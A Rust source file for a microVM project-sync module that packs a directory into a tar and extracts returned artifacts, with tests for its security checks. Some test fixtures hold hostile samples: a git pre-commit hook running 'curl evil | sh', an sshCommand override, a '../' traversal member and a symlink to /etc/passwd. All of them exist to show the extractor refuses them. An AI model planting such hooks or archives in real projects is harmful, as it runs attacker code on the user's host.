// SPDX-License-Identifier: Apache-2.0
//! `run <DIR>` sync mode: pack the project up, run in it, bring the artifacts back.
//!
//! # The daemon extracts uploads; this side extracts only what it chose
//!
//! The trust boundary is asymmetric and the code follows it. On the way *in*, the archive
//! is built here from a tree the caller owns, and the daemon — whose openat2 confinement
//! is the one extraction surface this workspace hardened (`agentd/src/fs.rs`) — unpacks
//! it. On the way *out*, the archive describes the VM's filesystem, and the VM is where
//! untrusted work runs, so `microvms-core` deliberately hands back raw bytes
//! (`session/files.rs`, `download_tar`) rather than an extraction. This module unpacks
//! only the members the caller's artifact globs selected, only when they are regular
//! files, through `unpack_in` — which refuses traversal outside the destination — so a
//! workload that appends `../../.ssh/authorized_keys` or a symlink member to the archive
//! gets it silently skipped rather than written.
//!
//! # Packing is deterministic, budgeted, and skips what cannot or should not travel
//!
//! Members are added in sorted path order, so the same tree produces the same bytes and a
//! test can assert on them. `.git`, `target`, `node_modules`, and `.venv` are skipped
//! whole: the daemon's real caps are 512 MiB per request body and 100 000 members
//! (`agentd/src/config.rs`), a repository's object store and a build tree blow through
//! both while contributing nothing to a build, and the archive is built in memory — so
//! the budget is enforced *here*, during the walk, before a byte is allocated, and a tree
//! over budget is `ERR_SYNC` naming the offending subtree rather than an OOM kill.
//! Sockets, fifos, and devices are skipped too: `tar` refuses to archive them, the daemon
//! refuses to extract them, and a live `puma.sock` under `tmp/` must not refuse the whole
//! project. Symlinks are preserved as links (`follow_symlinks(false)`): following them
//! would inline files from outside the tree, which is both a silent size multiplier and
//! an exfiltration shape.

use std::path::Path;

/// Directory names never packed. `.git` also protects the *extraction* side — see
/// [`extract_artifacts`] — so removing it here without reading that doc comment would
/// reopen a hole, not just widen an upload.
const SKIPPED_DIRS: [&str; 4] = [".git", "target", "node_modules", ".venv"];

/// The pack's local byte budget: the daemon's `max_body_bytes` (512 MiB). Checked during
/// the walk, on file sizes, so an over-budget tree is refused before the archive is
/// allocated — the alternative is building multi-gigabyte tar bytes in a `Vec` and
/// learning about the cap from the daemon's 413 (or the OOM killer) afterwards.
const MAX_PACK_BYTES: u64 = 512 * 1024 * 1024;

/// The pack's member budget: the daemon's `max_tar_members`.
const MAX_PACK_MEMBERS: usize = 100_000;

/// Where the synced tree lands in the guest, and the exec's working directory.
///
/// `/workspace`: the daemon's `write_tar` creates the root it is given
/// (`fs.rs`, `Dir::open` runs `create_dir_all`), and core's own tar tests spell it this
/// way. A constant rather than a flag — a knob would let two invocations against one VM
/// disagree about where "the project" is.
pub const REMOTE_WORKDIR: &str = "/workspace";

/// Why a local pack or unpack failed. The `ERR_SYNC` row's payload.
#[derive(Debug)]
pub struct SyncError(pub String);

impl std::fmt::Display for SyncError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        self.0.fmt(f)
    }
}

/// What the pack produced, for the envelope's `sync` report.
#[derive(Debug)]
pub struct Packed {
    pub archive: Vec<u8>,
    pub members: usize,
}

/// Packs `dir` into a tar archive: sorted member order, the skip list applied, budgets
/// enforced during the walk, symlinks preserved as links rather than followed.
pub fn pack(dir: &Path) -> Result<Packed, SyncError> {
    let mut walk = Walk::default();
    collect(dir, &mut walk)?;
    walk.paths.sort();

    let mut builder = tar::Builder::new(Vec::new());
    builder.follow_symlinks(false);
    let mut members = 0usize;
    for path in &walk.paths {
        let relative = path.strip_prefix(dir).expect("collected under dir");
        builder
            .append_path_with_name(path, relative)
            .map_err(|error| SyncError(format!("packing {}: {error}", path.display())))?;
        members += 1;
    }
    let archive = builder
        .into_inner()
        .map_err(|error| SyncError(format!("finishing the archive: {error}")))?;
    Ok(Packed { archive, members })
}

/// The walk's accumulator: the paths to pack, and the running budgets.
#[derive(Default)]
struct Walk {
    paths: Vec<std::path::PathBuf>,
    bytes: u64,
}

/// Walks `dir`, collecting every packable entry. Directories are collected too — an
/// empty directory a build script expects should exist on the other side. Skipped whole:
/// the [`SKIPPED_DIRS`] names. Skipped individually: sockets, fifos, devices — `tar`
/// refuses to archive them and the daemon refuses to extract them, so a live socket
/// under `tmp/` must not refuse the whole project. Budgets are checked as the walk runs,
/// so an over-budget tree is refused before any archive bytes exist.
fn collect(dir: &Path, walk: &mut Walk) -> Result<(), SyncError> {
    let entries = std::fs::read_dir(dir)
        .map_err(|error| SyncError(format!("reading {}: {error}", dir.display())))?;
    for entry in entries {
        let entry =
            entry.map_err(|error| SyncError(format!("reading {}: {error}", dir.display())))?;
        let path = entry.path();
        if SKIPPED_DIRS
            .iter()
            .any(|skipped| entry.file_name() == *skipped)
        {
            continue;
        }
        // `symlink_metadata`, not `metadata`: a symlink to a directory is a link member,
        // not a tree to descend into — descending would follow the link out of the tree.
        let kind = path
            .symlink_metadata()
            .map_err(|error| SyncError(format!("reading {}: {error}", path.display())))?;
        let file_type = kind.file_type();
        if !file_type.is_file() && !file_type.is_dir() && !file_type.is_symlink() {
            continue;
        }
        if file_type.is_file() {
            walk.bytes = walk.bytes.saturating_add(kind.len());
            if walk.bytes > MAX_PACK_BYTES {
                return Err(SyncError(format!(
                    "the tree exceeds the {} MiB upload budget at {} — the daemon refuses \
                     larger bodies. Move build output aside, or run against a smaller \
                     directory ({:?} are already skipped)",
                    MAX_PACK_BYTES / (1024 * 1024),
                    path.display(),
                    SKIPPED_DIRS,
                )));
            }
        }
        walk.paths.push(path.clone());
        if walk.paths.len() > MAX_PACK_MEMBERS {
            return Err(SyncError(format!(
                "the tree exceeds the {MAX_PACK_MEMBERS}-member upload budget at {} — the \
                 daemon refuses larger archives ({:?} are already skipped)",
                path.display(),
                SKIPPED_DIRS,
            )));
        }
        if file_type.is_dir() {
            collect(&path, walk)?;
        }
    }
    Ok(())
}

/// Where the incremental manifest lives in the guest: inside the workspace, deliberately.
///
/// The manifest is a cache of what the last sync put in `/workspace`, and a cache must die
/// with the thing it describes. A workload that wipes the workspace (a clean step, a fresh
/// checkout) also wipes the manifest, so the next `microvm sync` sees no manifest and does
/// a full upload instead of trusting a description of files that are gone. Stored outside
/// the workspace it would survive the wipe and the next sync would skip everything.
///
/// The name is excluded from packing and from the deletion diff (see [`diff`]), so the
/// manifest never deletes itself and a local file of the same name never travels.
pub const MANIFEST_PATH: &str = "/workspace/.microvm-sync-manifest.json";

/// The manifest's member name relative to the workspace, for the exclusions.
pub const MANIFEST_NAME: &str = ".microvm-sync-manifest.json";

/// What one sync left in the guest: every member's identity, keyed by relative path.
///
/// Paths are `/`-separated on every platform — the manifest crosses machines (a VM synced
/// from Linux can be resynced from Windows), so the host's separator must not leak into
/// the keys. Maps are ordered so the serialized form is deterministic and a test can
/// assert on bytes.
#[derive(Debug, Default, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct Manifest {
    /// The format version, for a future reader deciding whether it understands this.
    pub version: u32,
    /// Regular files: relative path → sha256 of the contents, lowercase hex.
    pub files: std::collections::BTreeMap<String, String>,
    /// Symlinks: relative path → link target, verbatim. The target string is the
    /// identity — two links to different targets are different members.
    pub symlinks: std::collections::BTreeMap<String, String>,
    /// Directories, including empty ones a build script expects to exist.
    pub dirs: std::collections::BTreeSet<String>,
}

/// The manifest format this build writes.
const MANIFEST_VERSION: u32 = 1;

/// A path relative to the synced root, `/`-separated regardless of platform.
fn relative_key(path: &Path, root: &Path) -> String {
    path.strip_prefix(root)
        .expect("collected under the root")
        .components()
        .map(|component| component.as_os_str().to_string_lossy())
        .collect::<Vec<_>>()
        .join("/")
}

/// Hashes and classifies the tree under `dir` into a [`Manifest`].
///
/// The walk is [`collect`] — the same skip list, the same budgets, the same symlink
/// stance as [`pack`] — so the manifest describes exactly the set a pack would upload.
/// A second walk elsewhere would be a second set of rules to keep in step.
///
/// Files are hashed streaming rather than read whole: the byte budget admits trees up
/// to 512 MiB, and a `Vec` of the largest admissible file per hash would be an
/// allocation the archive path never needs.
pub fn manifest(dir: &Path) -> Result<Manifest, SyncError> {
    use sha2::{Digest as _, Sha256};

    let mut walk = Walk::default();
    collect(dir, &mut walk)?;

    let mut built = Manifest {
        version: MANIFEST_VERSION,
        ..Manifest::default()
    };
    for path in &walk.paths {
        let key = relative_key(path, dir);
        let kind = path
            .symlink_metadata()
            .map_err(|error| SyncError(format!("reading {}: {error}", path.display())))?;
        let file_type = kind.file_type();
        if file_type.is_symlink() {
            let target = std::fs::read_link(path)
                .map_err(|error| SyncError(format!("reading link {}: {error}", path.display())))?;
            built
                .symlinks
                .insert(key, target.to_string_lossy().into_owned());
        } else if file_type.is_dir() {
            built.dirs.insert(key);
        } else {
            use std::io::Read as _;
            let mut file = std::fs::File::open(path)
                .map_err(|error| SyncError(format!("reading {}: {error}", path.display())))?;
            let mut hasher = Sha256::new();
            let mut buffer = [0u8; 64 * 1024];
            loop {
                let read = file
                    .read(&mut buffer)
                    .map_err(|error| SyncError(format!("hashing {}: {error}", path.display())))?;
                if read == 0 {
                    break;
                }
                hasher.update(&buffer[..read]);
            }
            built
                .files
                .insert(key, const_hex::encode(hasher.finalize()));
        }
    }
    Ok(built)
}

/// What an incremental sync has to do: which members travel, which remote paths die.
#[derive(Debug, Default, PartialEq)]
pub struct Delta {
    /// Relative paths to pack and upload: new members, changed files, retargeted links.
    pub upload: Vec<String>,
    /// Relative paths present remotely and gone locally, deepest first — so a directory's
    /// contents are named before the directory, and a non-recursive remove would still
    /// work in order.
    pub delete: Vec<String>,
}

impl Delta {
    /// Nothing to send and nothing to remove: the tree is already what the manifest says.
    pub fn is_empty(&self) -> bool {
        self.upload.is_empty() && self.delete.is_empty()
    }
}

/// What changed between the tree as it is (`local`) and as the last sync left it
/// (`remote`).
///
/// Identity is category-scoped: a path that was a file and is now a symlink appears in
/// both the upload set (the new member travels) and nowhere in the delete set — the
/// upload overwrites the name in place, which is the daemon's own extraction contract
/// (`agentd/src/fs.rs`: "an upload can legitimately overwrite a name").
///
/// [`MANIFEST_NAME`] never appears in either set: the manifest is not a member of the
/// tree it describes, and without this exclusion every incremental sync would order the
/// deletion of its own bookkeeping.
pub fn diff(local: &Manifest, remote: &Manifest) -> Delta {
    let mut delta = Delta::default();
    for (path, hash) in &local.files {
        if remote.files.get(path) != Some(hash) {
            delta.upload.push(path.clone());
        }
    }
    for (path, target) in &local.symlinks {
        if remote.symlinks.get(path) != Some(target) {
            delta.upload.push(path.clone());
        }
    }
    for path in &local.dirs {
        if !remote.dirs.contains(path) {
            delta.upload.push(path.clone());
        }
    }
    let lives_on = |path: &String| {
        local.files.contains_key(path)
            || local.symlinks.contains_key(path)
            || local.dirs.contains(path)
            || path == MANIFEST_NAME
    };
    delta.delete.extend(
        remote
            .files
            .keys()
            .chain(remote.symlinks.keys())
            .chain(remote.dirs.iter())
            .filter(|path| !lives_on(path))
            .cloned(),
    );
    delta.upload.sort();
    // Deepest first: `a/b/c` before `a/b`, so removing in order never needs recursion.
    delta.delete.sort_by(|a, b| b.cmp(a));
    delta
}

/// Packs exactly the named relative paths under `dir`, in sorted member order.
///
/// The selective sibling of [`pack`]: same builder settings, same determinism, but the
/// member set is the caller's diff rather than a walk — which is the whole incremental
/// bet, an archive proportional to the edit rather than to the tree.
pub fn pack_paths(dir: &Path, paths: &[String]) -> Result<Packed, SyncError> {
    let mut sorted: Vec<&String> = paths.iter().collect();
    sorted.sort();
    let mut builder = tar::Builder::new(Vec::new());
    builder.follow_symlinks(false);
    let mut members = 0usize;
    for relative in sorted {
        let path = dir.join(relative);
        builder
            .append_path_with_name(&path, relative)
            .map_err(|error| SyncError(format!("packing {}: {error}", path.display())))?;
        members += 1;
    }
    let archive = builder
        .into_inner()
        .map_err(|error| SyncError(format!("finishing the archive: {error}")))?;
    Ok(Packed { archive, members })
}

/// One artifact brought back, for the envelope's `sync.artifacts` list.
pub struct Artifact {
    pub path: String,
    pub bytes: u64,
}

/// Unpacks the glob-selected regular-file members of `archive` into `dir`.
///
/// Everything else — unmatched members, symlinks, hardlinks, specials, directories — is
/// skipped, not refused: the archive is the VM's word and the globs are the caller's, so
/// the only members with any business landing locally are the intersection, as plain
/// files. `unpack_in` anchors the write under `dir` and refuses traversal, which covers
/// the archive that names `../escape`.
///
/// `.git` members are refused even when a glob matches them, and this is the extraction
/// side's own security line rather than symmetry for its own sake: `artifacts = ["**"]`
/// is the natural spelling for "bring everything back", and a workload that writes
/// `.git/hooks/pre-commit` (mode bits land verbatim) or sets `core.sshCommand` in
/// `.git/config` would execute on the *host*, as the caller, on their next `git` command.
/// Traversal refusal does not cover this — these are in-tree paths.
pub fn extract_artifacts(
    archive: &[u8],
    globs: &[String],
    dir: &Path,
) -> Result<Vec<Artifact>, SyncError> {
    let mut set = globset::GlobSetBuilder::new();
    for glob in globs {
        set.add(
            globset::Glob::new(glob)
                .map_err(|error| SyncError(format!("artifacts glob {glob:?}: {error}")))?,
        );
    }
    let set = set.build().map_err(|error| SyncError(error.to_string()))?;

    let mut out = Vec::new();
    let mut entries = tar::Archive::new(archive);
    let entries = entries
        .entries()
        .map_err(|error| SyncError(format!("reading the returned archive: {error}")))?;
    for entry in entries {
        let mut entry =
            entry.map_err(|error| SyncError(format!("reading the returned archive: {error}")))?;
        if entry.header().entry_type() != tar::EntryType::Regular {
            continue;
        }
        let path = entry
            .path()
            .map_err(|error| SyncError(format!("a member's path: {error}")))?
            .into_owned();
        // The host's repository is never a write target. See the doc comment: a hook or
        // a config key written here runs on the host, outside the sandbox.
        if path
            .components()
            .any(|component| component.as_os_str() == ".git")
        {
            continue;
        }
        if !set.is_match(&path) {
            continue;
        }
        let bytes = entry.size();
        let written = entry
            .unpack_in(dir)
            .map_err(|error| SyncError(format!("writing {}: {error}", path.display())))?;
        // `unpack_in` answers false for a member it refused (traversal); a refused member
        // is skipped like an unmatched one rather than failing the run that produced it.
        if written {
            out.push(Artifact {
                path: path.display().to_string(),
                bytes,
            });
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A tree under a temp dir, removed on drop.
    struct TempTree(std::path::PathBuf, #[allow(dead_code)] tempfile::TempDir);

    impl TempTree {
        fn new(label: &str) -> Self {
            let dir = tempfile::Builder::new()
                .prefix(&format!("microvm-sync-{label}-"))
                .tempdir()
                .expect("a temp dir");
            Self(dir.path().to_path_buf(), dir)
        }
    }

    fn member_names(archive: &[u8]) -> Vec<String> {
        tar::Archive::new(archive)
            .entries()
            .expect("parses")
            .map(|entry| {
                entry
                    .expect("a member")
                    .path()
                    .expect("a path")
                    .display()
                    .to_string()
            })
            .collect()
    }

    /// Every skip-list directory stays home; the working tree travels.
    #[test]
    fn packing_skips_the_skip_list_whole() {
        let tree = TempTree::new("skip-list");
        for skipped in SKIPPED_DIRS {
            std::fs::create_dir_all(tree.0.join(skipped)).expect("dir");
            std::fs::write(tree.0.join(skipped).join("payload"), b"stays home").expect("file");
        }
        std::fs::write(tree.0.join("kept.rs"), b"fn main() {}").expect("source");

        let packed = pack(&tree.0).expect("packs");
        let names = member_names(&packed.archive);
        assert_eq!(names, ["kept.rs"], "{names:?}");
    }

    /// A socket in the tree is skipped rather than refusing the whole project.
    #[cfg(unix)]
    #[test]
    fn packing_skips_a_live_socket_instead_of_refusing_the_tree() {
        let tree = TempTree::new("socket");
        std::fs::write(tree.0.join("app.rb"), b"puts :hi").expect("source");
        let _listener = std::os::unix::net::UnixListener::bind(tree.0.join("puma.sock"))
            .expect("a live socket");

        let packed = pack(&tree.0).expect("a socket must not refuse the project");
        assert_eq!(member_names(&packed.archive), ["app.rb"]);
    }

    /// A tree over the member budget is refused during the walk, naming the subtree —
    /// before any archive bytes are allocated.
    #[test]
    fn packing_refuses_an_over_budget_tree_by_name() {
        let tree = TempTree::new("member-budget");
        // Not 100k real files: the budget is a constant, so the test asserts the check
        // through the byte budget instead, with one file whose *reported* size exceeds
        // it — a sparse file costs nothing on disk.
        let big = tree.0.join("huge.bin");
        let file = std::fs::File::create(&big).expect("creates");
        file.set_len(MAX_PACK_BYTES + 1).expect("sparse grow");
        drop(file);

        let error = pack(&tree.0).expect_err("over budget");
        assert!(error.0.contains("huge.bin"), "{error}");
        assert!(error.0.contains("MiB"), "{error}");
    }

    /// `.git` members never land locally, even when the glob matches them.
    ///
    /// The security line: `artifacts = ["**"]` is the natural "bring everything back",
    /// and a workload-written `.git/hooks/pre-commit` would run on the *host* at the
    /// caller's next commit.
    ///
    /// **Falsification** — drop the `.git`-component check from `extract_artifacts` and
    /// the no-`.git`-write assertion goes red with the hook on disk. Done on 2026-08-28;
    /// failed as stated; restored.
    #[test]
    fn extraction_never_writes_under_the_local_git() {
        let tree = TempTree::new("git-refusal");
        let archive = archive_of(&[
            (".git/hooks/pre-commit", b"#!/bin/sh\ncurl evil | sh\n"),
            (".git/config", b"[core]\n\tsshCommand = /tmp/pwn\n"),
            ("dist/report.txt", b"fine"),
        ]);
        let got = extract_artifacts(&archive, &["**".into()], &tree.0).expect("extracts");
        assert_eq!(got.len(), 1, "only the non-git member lands");
        assert_eq!(got[0].path, "dist/report.txt");
        assert!(!tree.0.join(".git").exists(), "no .git write, ever");
    }

    /// `.git` never reaches the archive; the working tree does.
    #[test]
    fn packing_skips_git_and_keeps_the_working_tree() {
        let tree = TempTree::new("skip-git");
        std::fs::create_dir_all(tree.0.join(".git/objects")).expect("git dir");
        std::fs::write(tree.0.join(".git/objects/blob"), b"loose object").expect("blob");
        std::fs::create_dir_all(tree.0.join("src")).expect("src");
        std::fs::write(tree.0.join("src/main.rs"), b"fn main() {}").expect("source");

        let packed = pack(&tree.0).expect("packs");
        let names = member_names(&packed.archive);
        assert!(names.iter().any(|name| name == "src/main.rs"), "{names:?}");
        assert!(!names.iter().any(|name| name.contains(".git")), "{names:?}");
    }

    /// A symlink member survives as a link and its target is not inlined.
    #[cfg(unix)]
    #[test]
    fn packing_preserves_a_symlink_without_following_it() {
        let tree = TempTree::new("symlink");
        std::fs::write(tree.0.join("real.txt"), b"data").expect("file");
        std::os::unix::fs::symlink("real.txt", tree.0.join("link.txt")).expect("link");

        let packed = pack(&tree.0).expect("packs");
        let mut archive = tar::Archive::new(packed.archive.as_slice());
        let mut kinds = std::collections::BTreeMap::new();
        for entry in archive.entries().expect("parses") {
            let entry = entry.expect("a member");
            kinds.insert(
                entry.path().expect("a path").display().to_string(),
                entry.header().entry_type(),
            );
        }
        assert_eq!(kinds["link.txt"], tar::EntryType::Symlink, "{kinds:?}");
    }

    /// The same tree packs to the same bytes: member order is sorted, not readdir order.
    #[test]
    fn packing_is_deterministic() {
        let tree = TempTree::new("deterministic");
        for name in ["b.txt", "a.txt", "c.txt"] {
            std::fs::write(tree.0.join(name), name.as_bytes()).expect("writes");
        }
        let first = pack(&tree.0).expect("packs");
        let second = pack(&tree.0).expect("packs");
        assert_eq!(first.archive, second.archive);
        assert_eq!(
            member_names(&first.archive),
            ["a.txt", "b.txt", "c.txt"],
            "sorted, not readdir order"
        );
    }

    fn archive_of(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (name, body) in members {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, name, *body)
                .expect("appends");
        }
        builder.into_inner().expect("finishes")
    }

    /// Only glob-matched members land; the rest of the VM's word stays in the VM.
    #[test]
    fn extraction_writes_matched_members_and_skips_the_rest() {
        let tree = TempTree::new("select");
        let archive = archive_of(&[
            ("dist/report.txt", b"selected"),
            ("secrets.env", b"never asked for"),
        ]);
        let got = extract_artifacts(&archive, &["dist/**".into()], &tree.0).expect("extracts");
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].path, "dist/report.txt");
        assert!(tree.0.join("dist/report.txt").exists());
        assert!(!tree.0.join("secrets.env").exists());
    }

    /// A member that traverses out of the destination is skipped, not written.
    ///
    /// The fixture writes the `..` name into the header's own bytes, because
    /// `Builder::append_data` refuses to *create* such a member — and an attacker does not
    /// use the builder. This is the archive as a hostile daemon would actually send it.
    #[test]
    fn extraction_refuses_traversal_out_of_the_destination() {
        let tree = TempTree::new("traversal");
        let inner = tree.0.join("inner");
        std::fs::create_dir_all(&inner).expect("inner");

        let body = b"out";
        let mut header = tar::Header::new_gnu();
        {
            let name = b"../escape.txt";
            let gnu = header.as_gnu_mut().expect("a gnu header");
            gnu.name[..name.len()].copy_from_slice(name);
        }
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        let mut archive = Vec::new();
        archive.extend_from_slice(header.as_bytes());
        archive.extend_from_slice(body);
        archive.resize(archive.len().div_ceil(512) * 512, 0);
        archive.extend_from_slice(&[0u8; 1024]);

        let got = extract_artifacts(&archive, &["**".into()], &inner).expect("extracts nothing");
        assert!(got.is_empty(), "{:?}", got.len());
        assert!(!tree.0.join("escape.txt").exists());
    }

    /// The manifest names every member kind with a stable identity, and the same tree
    /// manifests identically twice.
    #[test]
    fn a_manifest_is_deterministic_and_covers_every_member_kind() {
        let tree = TempTree::new("manifest");
        std::fs::create_dir_all(tree.0.join("src")).expect("dir");
        std::fs::create_dir_all(tree.0.join("empty")).expect("empty dir");
        std::fs::write(tree.0.join("src/main.rs"), b"fn main() {}").expect("file");
        #[cfg(unix)]
        std::os::unix::fs::symlink("src/main.rs", tree.0.join("link.rs")).expect("link");

        let first = manifest(&tree.0).expect("manifests");
        let second = manifest(&tree.0).expect("manifests");
        assert_eq!(first, second, "same tree, same manifest");
        assert_eq!(first.version, MANIFEST_VERSION);
        // sha256("fn main() {}"), computed independently with sha256sum.
        assert_eq!(
            first.files["src/main.rs"],
            "ef32637cb9c3ec2e3968c9cbdf26a5e9c172be94f88af533e14bd43f892d5297"
        );
        assert!(first.dirs.contains("empty"), "{:?}", first.dirs);
        #[cfg(unix)]
        assert_eq!(first.symlinks["link.rs"], "src/main.rs");
    }

    /// The manifest walks with the pack's own skip list — what never uploads never
    /// appears, so a skipped directory cannot show up as a deletion either.
    #[test]
    fn a_manifest_skips_what_packing_skips() {
        let tree = TempTree::new("manifest-skip");
        std::fs::create_dir_all(tree.0.join(".git")).expect("git");
        std::fs::write(tree.0.join(".git/HEAD"), b"ref: main").expect("head");
        std::fs::write(tree.0.join("kept.rs"), b"fn main() {}").expect("source");

        let built = manifest(&tree.0).expect("manifests");
        assert_eq!(built.files.len(), 1, "{:?}", built.files);
        assert!(built.files.contains_key("kept.rs"));
        assert!(built.dirs.is_empty(), "{:?}", built.dirs);
    }

    /// An unchanged tree diffs to an empty delta — the fact that makes the second sync
    /// of an unchanged tree transfer ~0 bytes (issue #71's acceptance line).
    #[test]
    fn an_unchanged_tree_diffs_to_nothing() {
        let tree = TempTree::new("diff-unchanged");
        std::fs::write(tree.0.join("a.txt"), b"a").expect("file");
        let local = manifest(&tree.0).expect("manifests");
        let remote = manifest(&tree.0).expect("manifests");
        let delta = diff(&local, &remote);
        assert!(delta.is_empty(), "{delta:?}");
    }

    /// Each change class lands in the right half of the delta: edits and additions
    /// upload, disappearances delete, and the unchanged member stays home.
    #[test]
    fn a_diff_names_changed_new_and_deleted_members_and_nothing_else() {
        let mut remote = Manifest {
            version: MANIFEST_VERSION,
            ..Manifest::default()
        };
        remote.files.insert("same.txt".into(), "hash-same".into());
        remote.files.insert("edited.txt".into(), "hash-old".into());
        remote.files.insert("removed.txt".into(), "hash-x".into());
        remote.dirs.insert("gone-dir".into());
        remote.dirs.insert("gone-dir/nested".into());
        remote.symlinks.insert("link".into(), "old-target".into());

        let mut local = Manifest {
            version: MANIFEST_VERSION,
            ..Manifest::default()
        };
        local.files.insert("same.txt".into(), "hash-same".into());
        local.files.insert("edited.txt".into(), "hash-new".into());
        local.files.insert("added.txt".into(), "hash-add".into());
        local.symlinks.insert("link".into(), "new-target".into());

        let delta = diff(&local, &remote);
        assert_eq!(delta.upload, ["added.txt", "edited.txt", "link"]);
        // Deepest first, so a non-recursive remove works in this order.
        assert_eq!(delta.delete, ["removed.txt", "gone-dir/nested", "gone-dir"]);
    }

    /// The manifest never orders its own deletion.
    ///
    /// It lives in the workspace (see [`MANIFEST_PATH`] on why) and is therefore in the
    /// remote tree without being in any local one — the one permanent asymmetry the
    /// diff has to know about.
    #[test]
    fn a_diff_never_deletes_the_manifest_itself() {
        let mut remote = Manifest::default();
        remote.files.insert(MANIFEST_NAME.into(), "hash".into());
        let delta = diff(&Manifest::default(), &remote);
        assert!(delta.is_empty(), "{delta:?}");
    }

    /// A selective pack carries exactly the named members — the archive is proportional
    /// to the edit, not to the tree.
    #[test]
    fn packing_selected_paths_carries_them_and_nothing_else() {
        let tree = TempTree::new("pack-paths");
        std::fs::create_dir_all(tree.0.join("src")).expect("dir");
        std::fs::write(tree.0.join("src/changed.rs"), b"edited").expect("file");
        std::fs::write(tree.0.join("src/unchanged.rs"), b"same").expect("file");

        let packed =
            pack_paths(&tree.0, &["src/changed.rs".to_string()]).expect("packs the selection");
        assert_eq!(packed.members, 1);
        assert_eq!(member_names(&packed.archive), ["src/changed.rs"]);
    }

    /// A symlink member is never extracted, even when a glob matches it.
    #[test]
    fn extraction_skips_non_regular_members() {
        let tree = TempTree::new("nonregular");
        let mut builder = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        header.set_cksum();
        builder
            .append_link(&mut header, "dist/link", "/etc/passwd")
            .expect("appends");
        let archive = builder.into_inner().expect("finishes");

        let got = extract_artifacts(&archive, &["dist/**".into()], &tree.0).expect("extracts");
        assert!(got.is_empty());
        assert!(!tree.0.join("dist/link").exists());
    }
}
